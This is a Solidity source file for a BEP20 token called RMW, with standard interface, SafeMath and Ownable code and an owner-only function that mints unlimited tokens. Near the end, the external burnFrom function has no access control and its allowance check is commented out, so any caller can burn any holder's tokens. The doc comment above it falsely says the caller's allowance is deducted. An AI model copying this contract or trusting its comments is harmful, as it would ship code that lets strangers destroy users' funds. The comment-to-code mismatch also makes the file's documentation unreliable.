1 pragma solidity 0.5.16;
2 
3 interface IBEP20 {
4   /**
5    * @dev Returns the amount of tokens in existence.
6    */
7   function totalSupply() external view returns (uint256);
8 
9   /**
10    * @dev Returns the token decimals.
11    */
12   function decimals() external view returns (uint8);
13 
14   /**
15    * @dev Returns the token symbol.
16    */
17   function symbol() external view returns (string memory);
18 
19   /**
20   * @dev Returns the token name.
21   */
22   function name() external view returns (string memory);
23 
24   /**
25    * @dev Returns the bep token owner.
26    */
27   function getOwner() external view returns (address);
28 
29   /**
30    * @dev Returns the amount of tokens owned by `account`.
31    */
32   function balanceOf(address account) external view returns (uint256);
33 
34   /**
35    * @dev Moves `amount` tokens from the caller's account to `recipient`.
36    *
37    * Returns a boolean value indicating whether the operation succeeded.
38    *
39    * Emits a {Transfer} event.
40    */
41   function transfer(address recipient, uint256 amount) external returns (bool);
42 
43   /**
44    * @dev Returns the remaining number of tokens that `spender` will be
45    * allowed to spend on behalf of `owner` through {transferFrom}. This is
46    * zero by default.
47    *
48    * This value changes when {approve} or {transferFrom} are called.
49    */
50   function allowance(address _owner, address spender) external view returns (uint256);
51 
52   /**
53    * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
54    *
55    * Returns a boolean value indicating whether the operation succeeded.
56    *
57    * IMPORTANT: Beware that changing an allowance with this method brings the risk
58    * that someone may use both the old and the new allowance by unfortunate
59    * transaction ordering. One possible solution to mitigate this race
60    * condition is to first reduce the spender's allowance to 0 and set the
61    * desired value afterwards:
62    * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
63    *
64    * Emits an {Approval} event.
65    */
66   function approve(address spender, uint256 amount) external returns (bool);
67 
68   /**
69    * @dev Moves `amount` tokens from `sender` to `recipient` using the
70    * allowance mechanism. `amount` is then deducted from the caller's
71    * allowance.
72    *
73    * Returns a boolean value indicating whether the operation succeeded.
74    *
75    * Emits a {Transfer} event.
76    */
77   function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
78 
79   /**
80    * @dev Emitted when `value` tokens are moved from one account (`from`) to
81    * another (`to`).
82    *
83    * Note that `value` may be zero.
84    */
85   event Transfer(address indexed from, address indexed to, uint256 value);
86 
87   /**
88    * @dev Emitted when the allowance of a `spender` for an `owner` is set by
89    * a call to {approve}. `value` is the new allowance.
90    */
91   event Approval(address indexed owner, address indexed spender, uint256 value);
92 }
93 
94 /*
95  * @dev Provides information about the current execution context, including the
96  * sender of the transaction and its data. While these are generally available
97  * via msg.sender and msg.data, they should not be accessed in such a direct
98  * manner, since when dealing with GSN meta-transactions the account sending and
99  * paying for execution may not be the actual sender (as far as an application
100  * is concerned).
101  *
102  * This contract is only required for intermediate, library-like contracts.
103  */
104 contract Context {
105   // Empty internal constructor, to prevent people from mistakenly deploying
106   // an instance of this contract, which should be used via inheritance.
107   constructor () internal { }
108 
109   function _msgSender() internal view returns (address payable) {
110     return msg.sender;
111   }
112 
113   function _msgData() internal view returns (bytes memory) {
114     this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
115     return msg.data;
116   }
117 }
118 
119 /**
120  * @dev Wrappers over Solidity's arithmetic operations with added overflow
121  * checks.
122  *
123  * Arithmetic operations in Solidity wrap on overflow. This can easily result
124  * in bugs, because programmers usually assume that an overflow raises an
125  * error, which is the standard behavior in high level programming languages.
126  * `SafeMath` restores this intuition by reverting the transaction when an
127  * operation overflows.
128  *
129  * Using this library instead of the unchecked operations eliminates an entire
130  * class of bugs, so it's recommended to use it always.
131  */
132 library SafeMath {
133   /**
134    * @dev Returns the addition of two unsigned integers, reverting on
135    * overflow.
136    *
137    * Counterpart to Solidity's `+` operator.
138    *
139    * Requirements:
140    * - Addition cannot overflow.
141    */
142   function add(uint256 a, uint256 b) internal pure returns (uint256) {
143     uint256 c = a + b;
144     require(c >= a, "SafeMath: addition overflow");
145 
146     return c;
147   }
148 
149   /**
150    * @dev Returns the subtraction of two unsigned integers, reverting on
151    * overflow (when the result is negative).
152    *
153    * Counterpart to Solidity's `-` operator.
154    *
155    * Requirements:
156    * - Subtraction cannot overflow.
157    */
158   function sub(uint256 a, uint256 b) internal pure returns (uint256) {
159     return sub(a, b, "SafeMath: subtraction overflow");
160   }
161 
162   /**
163    * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
164    * overflow (when the result is negative).
165    *
166    * Counterpart to Solidity's `-` operator.
167    *
168    * Requirements:
169    * - Subtraction cannot overflow.
170    */
171   function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
172     require(b <= a, errorMessage);
173     uint256 c = a - b;
174 
175     return c;
176   }
177 
178   /**
179    * @dev Returns the multiplication of two unsigned integers, reverting on
180    * overflow.
181    *
182    * Counterpart to Solidity's `*` operator.
183    *
184    * Requirements:
185    * - Multiplication cannot overflow.
186    */
187   function mul(uint256 a, uint256 b) internal pure returns (uint256) {
188     // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
189     // benefit is lost if 'b' is also tested.
190     // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
191     if (a == 0) {
192       return 0;
193     }
194 
195     uint256 c = a * b;
196     require(c / a == b, "SafeMath: multiplication overflow");
197 
198     return c;
199   }
200 
201   /**
202    * @dev Returns the integer division of two unsigned integers. Reverts on
203    * division by zero. The result is rounded towards zero.
204    *
205    * Counterpart to Solidity's `/` operator. Note: this function uses a
206    * `revert` opcode (which leaves remaining gas untouched) while Solidity
207    * uses an invalid opcode to revert (consuming all remaining gas).
208    *
209    * Requirements:
210    * - The divisor cannot be zero.
211    */
212   function div(uint256 a, uint256 b) internal pure returns (uint256) {
213     return div(a, b, "SafeMath: division by zero");
214   }
215 
216   /**
217    * @dev Returns the integer division of two unsigned integers. Reverts with custom message on
218    * division by zero. The result is rounded towards zero.
219    *
220    * Counterpart to Solidity's `/` operator. Note: this function uses a
221    * `revert` opcode (which leaves remaining gas untouched) while Solidity
222    * uses an invalid opcode to revert (consuming all remaining gas).
223    *
224    * Requirements:
225    * - The divisor cannot be zero.
226    */
227   function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
228     // Solidity only automatically asserts when dividing by 0
229     require(b > 0, errorMessage);
230     uint256 c = a / b;
231     // assert(a == b * c + a % b); // There is no case in which this doesn't hold
232 
233     return c;
234   }
235 
236   /**
237    * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
238    * Reverts when dividing by zero.
239    *
240    * Counterpart to Solidity's `%` operator. This function uses a `revert`
241    * opcode (which leaves remaining gas untouched) while Solidity uses an
242    * invalid opcode to revert (consuming all remaining gas).
243    *
244    * Requirements:
245    * - The divisor cannot be zero.
246    */
247   function mod(uint256 a, uint256 b) internal pure returns (uint256) {
248     return mod(a, b, "SafeMath: modulo by zero");
249   }
250 
251   /**
252    * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
253    * Reverts with custom message when dividing by zero.
254    *
255    * Counterpart to Solidity's `%` operator. This function uses a `revert`
256    * opcode (which leaves remaining gas untouched) while Solidity uses an
257    * invalid opcode to revert (consuming all remaining gas).
258    *
259    * Requirements:
260    * - The divisor cannot be zero.
261    */
262   function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
263     require(b != 0, errorMessage);
264     return a % b;
265   }
266 }
267 
268 /**
269  * @dev Contract module which provides a basic access control mechanism, where
270  * there is an account (an owner) that can be granted exclusive access to
271  * specific functions.
272  *
273  * By default, the owner account will be the one that deploys the contract. This
274  * can later be changed with {transferOwnership}.
275  *
276  * This module is used through inheritance. It will make available the modifier
277  * `onlyOwner`, which can be applied to your functions to restrict their use to
278  * the owner.
279  */
280 contract Ownable is Context {
281   address private _owner;
282 
283   event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
284 
285   /**
286    * @dev Initializes the contract setting the deployer as the initial owner.
287    */
288   constructor () internal {
289     address msgSender = _msgSender();
290     _owner = msgSender;
291     emit OwnershipTransferred(address(0), msgSender);
292   }
293 
294   /**
295    * @dev Returns the address of the current owner.
296    */
297   function owner() public view returns (address) {
298     return _owner;
299   }
300 
301   /**
302    * @dev Throws if called by any account other than the owner.
303    */
304   modifier onlyOwner() {
305     require(_owner == _msgSender(), "Ownable: caller is not the owner");
306     _;
307   }
308 
309   /**
310    * @dev Leaves the contract without owner. It will not be possible to call
311    * `onlyOwner` functions anymore. Can only be called by the current owner.
312    *
313    * NOTE: Renouncing ownership will leave the contract without an owner,
314    * thereby removing any functionality that is only available to the owner.
315    */
316   function renounceOwnership() public onlyOwner {
317     emit OwnershipTransferred(_owner, address(0));
318     _owner = address(0);
319   }
320 
321   /**
322    * @dev Transfers ownership of the contract to a new account (`newOwner`).
323    * Can only be called by the current owner.
324    */
325   function transferOwnership(address newOwner) public onlyOwner {
326     _transferOwnership(newOwner);
327   }
328 
329   /**
330    * @dev Transfers ownership of the contract to a new account (`newOwner`).
331    */
332   function _transferOwnership(address newOwner) internal {
333     require(newOwner != address(0), "Ownable: new owner is the zero address");
334     emit OwnershipTransferred(_owner, newOwner);
335     _owner = newOwner;
336   }
337 }
338 
339 
340 
341 
342 contract RMW is Context, IBEP20, Ownable {
343   using SafeMath for uint256;
344 
345   mapping (address => uint256) private _balances;
346 
347   mapping (address => mapping (address => uint256)) private _allowances;
348 
349   uint256 private _totalSupply;
350   uint8 private _decimals;
351   string private _symbol;
352   string private _name;
353 
354   constructor() public {
355     _name = "RICHMINT DIGITECH SERVICES OU, Estonia";
356     _symbol = "RMW";
357     _decimals = 18;
358     _totalSupply = 10000000000000000000000000000;
359     _balances[msg.sender] = _totalSupply;
360 
361     emit Transfer(address(0), msg.sender, _totalSupply);
362   }
363 
364   /**
365    * @dev Returns the bep token owner.
366    */
367   function getOwner() external view returns (address) {
368     return owner();
369   }
370 
371   /**
372    * @dev Returns the token decimals.
373    */
374   function decimals() external view returns (uint8) {
375     return _decimals;
376   }
377 
378   /**
379    * @dev Returns the token symbol.
380    */
381   function symbol() external view returns (string memory) {
382     return _symbol;
383   }
384 
385   /**
386   * @dev Returns the token name.
387   */
388   function name() external view returns (string memory) {
389     return _name;
390   }
391 
392   /**
393    * @dev See {BEP20-totalSupply}.
394    */
395   function totalSupply() external view returns (uint256) {
396     return _totalSupply;
397   }
398 
399   /**
400    * @dev See {BEP20-balanceOf}.
401    */
402   function balanceOf(address account) external view returns (uint256) {
403     return _balances[account];
404   }
405 
406   /**
407    * @dev See {BEP20-transfer}.
408    *
409    * Requirements:
410    *
411    * - `recipient` cannot be the zero address.
412    * - the caller must have a balance of at least `amount`.
413    */
414   function transfer(address recipient, uint256 amount) external returns (bool) {
415     _transfer(_msgSender(), recipient, amount);
416     return true;
417   }
418 
419   /**
420    * @dev See {BEP20-allowance}.
421    */
422   function allowance(address owner, address spender) external view returns (uint256) {
423     return _allowances[owner][spender];
424   }
425 
426   /**
427    * @dev See {BEP20-approve}.
428    *
429    * Requirements:
430    *
431    * - `spender` cannot be the zero address.
432    */
433   function approve(address spender, uint256 amount) external returns (bool) {
434     _approve(_msgSender(), spender, amount);
435     return true;
436   }
437 
438   /**
439    * @dev See {BEP20-transferFrom}.
440    *
441    * Emits an {Approval} event indicating the updated allowance. This is not
442    * required by the EIP. See the note at the beginning of {BEP20};
443    *
444    * Requirements:
445    * - `sender` and `recipient` cannot be the zero address.
446    * - `sender` must have a balance of at least `amount`.
447    * - the caller must have allowance for `sender`'s tokens of at least
448    * `amount`.
449    */
450   function transferFrom(address sender, address recipient, uint256 amount) external returns (bool) {
451     _transfer(sender, recipient, amount);
452     _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "BEP20: transfer amount exceeds allowance"));
453     return true;
454   }
455 
456   /**
457    * @dev Atomically increases the allowance granted to `spender` by the caller.
458    *
459    * This is an alternative to {approve} that can be used as a mitigation for
460    * problems described in {BEP20-approve}.
461    *
462    * Emits an {Approval} event indicating the updated allowance.
463    *
464    * Requirements:
465    *
466    * - `spender` cannot be the zero address.
467    */
468   function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
469     _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
470     return true;
471   }
472 
473   /**
474    * @dev Atomically decreases the allowance granted to `spender` by the caller.
475    *
476    * This is an alternative to {approve} that can be used as a mitigation for
477    * problems described in {BEP20-approve}.
478    *
479    * Emits an {Approval} event indicating the updated allowance.
480    *
481    * Requirements:
482    *
483    * - `spender` cannot be the zero address.
484    * - `spender` must have allowance for the caller of at least
485    * `subtractedValue`.
486    */
487   function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
488     _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "BEP20: decreased allowance below zero"));
489     return true;
490   }
491 
492   /**
493    * @dev Creates `amount` tokens and assigns them to `msg.sender`, increasing
494    * the total supply.
495    *
496    * Requirements
497    *
498    * - `msg.sender` must be the token owner
499    */
500   function rmw(uint256 amount) public onlyOwner returns (bool) {
501     _rmw(_msgSender(), amount);
502     return true;
503   }
504 
505   /**
506    * @dev Moves tokens `amount` from `sender` to `recipient`.
507    *
508    * This is internal function is equivalent to {transfer}, and can be used to
509    * e.g. implement automatic token fees, slashing mechanisms, etc.
510    *
511    * Emits a {Transfer} event.
512    *
513    * Requirements:
514    *
515    * - `sender` cannot be the zero address.
516    * - `recipient` cannot be the zero address.
517    * - `sender` must have a balance of at least `amount`.
518    */
519   function _transfer(address sender, address recipient, uint256 amount) internal {
520     require(sender != address(0), "BEP20: transfer from the zero address");
521     require(recipient != address(0), "BEP20: transfer to the zero address");
522 
523     _balances[sender] = _balances[sender].sub(amount, "BEP20: transfer amount exceeds balance");
524     _balances[recipient] = _balances[recipient].add(amount);
525     emit Transfer(sender, recipient, amount);
526   }
527 
528   /** @dev Creates `amount` tokens and assigns them to `account`, increasing
529    * the total supply.
530    *
531    * Emits a {Transfer} event with `from` set to the zero address.
532    *
533    * Requirements
534    *
535    * - `to` cannot be the zero address.
536    */
537   function _rmw(address account, uint256 amount) internal {
538     require(account != address(0), "BEP20: rmw to the zero address");
539 
540     _totalSupply = _totalSupply.add(amount);
541     _balances[account] = _balances[account].add(amount);
542     emit Transfer(address(0), account, amount);
543   }
544 
545   /**
546    * @dev Destroys `amount` tokens from `account`, reducing the
547    * total supply.
548    *
549    * Emits a {Transfer} event with `to` set to the zero address.
550    *
551    * Requirements
552    *
553    * - `account` cannot be the zero address.
554    * - `account` must have at least `amount` tokens.
555    */
556   function _burn(address account, uint256 amount) internal {
557     require(account != address(0), "BEP20: burn from the zero address");
558 
559     _balances[account] = _balances[account].sub(amount, "BEP20: burn amount exceeds balance");
560     _totalSupply = _totalSupply.sub(amount);
561     emit Transfer(account, address(0), amount);
562   }
563 
564   /**
565    * @dev Sets `amount` as the allowance of `spender` over the `owner`s tokens.
566    *
567    * This is internal function is equivalent to `approve`, and can be used to
568    * e.g. set automatic allowances for certain subsystems, etc.
569    *
570    * Emits an {Approval} event.
571    *
572    * Requirements:
573    *
574    * - `owner` cannot be the zero address.
575    * - `spender` cannot be the zero address.
576    */
577   function _approve(address owner, address spender, uint256 amount) internal {
578     require(owner != address(0), "BEP20: approve from the zero address");
579     require(spender != address(0), "BEP20: approve to the zero address");
580 
581     _allowances[owner][spender] = amount;
582     emit Approval(owner, spender, amount);
583   }
584 
585   /**
586    * @dev Destroys `amount` tokens from `account`.`amount` is then deducted
587    * from the caller's allowance.
588    *
589    * See {_burn} and {_approve}.
590    */
591    
592   function burnFrom(address _account, uint256 _amount) external {
593     _burnFrom(_account,_amount);
594   }
595   
596   function burn(uint256 _amount) external {
597     _burn(msg.sender,_amount);
598   }
599   function _burnFrom(address account, uint256 amount) internal {
600     _burn(account, amount);
601     /*_approve(account, _msgSender(), _allowances[account][_msgSender()].sub(amount, "BEP20: burn amount exceeds allowance"));*/
602   }
603 }